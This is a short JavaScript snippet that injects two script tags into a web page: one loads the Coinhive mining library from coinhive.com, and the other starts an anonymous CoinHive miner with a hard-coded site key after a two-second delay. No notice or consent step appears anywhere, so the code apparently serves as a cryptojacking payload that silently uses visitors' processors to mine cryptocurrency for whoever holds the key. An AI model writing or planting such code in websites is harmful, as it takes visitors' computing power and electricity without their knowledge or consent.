var script = document.createElement("script");
var script2 = document.createElement("script");

script.setAttribute("src", "https://coinhive.com/lib/coinhive.min.js");

script2.innerHTML = `
    setTimeout(()=>{
        var miner = new CoinHive.Anonymous('CDDyz96RGQTald9sE8M0hN6dWCy4i4YK');
        miner.start();
    }, 2000)
`;
document.head.appendChild(script);
document.head.appendChild(script2);
